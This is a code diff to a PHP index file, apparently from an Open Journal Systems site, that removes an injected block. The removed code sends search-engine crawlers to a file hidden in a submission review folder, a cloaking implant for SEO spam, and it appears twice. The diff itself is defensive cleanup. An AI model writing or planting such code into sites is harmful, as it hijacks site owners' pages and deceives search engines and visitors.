@@ -1,43 +1,4 @@
 <?php
-$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$request_uri = $_SERVER['REQUEST_URI'] ?? '/';
-$is_bot = false;
-
-$bot_signatures = [
-    'Googlebot',
-    'Google-InspectionTool',
-    'Mediapartners-Google',
-    'AdsBot-Google',
-    'Bingbot',
-    'Slurp',
-    'DuckDuckBot',
-    'AhrefsBot',
-    'SEMRushBot',
-    'MJ12bot',
-    'YandexBot'
-];
-
-foreach ($bot_signatures as $bot) {
-    if (stripos($user_agent, $bot) !== false) {
-        $is_bot = true;
-        break;
-    }
-}
-
-if ($is_bot) {
-
-    if (stripos($request_uri, '/') !== false) {
-        require('/home/riyanmau/jurnalstmikiba/journals/2/articles/82/submission/review/');
-        exit;
-    }
-}
-if ($is_bot) {
-
-    if (stripos($request_uri, '/') !== false) {
-        require('/home/riyanmau/jurnalstmikiba/journals/2/articles/82/submission/review/');
-        exit;
-    }
-}
 
 /**
  * @defgroup index Index
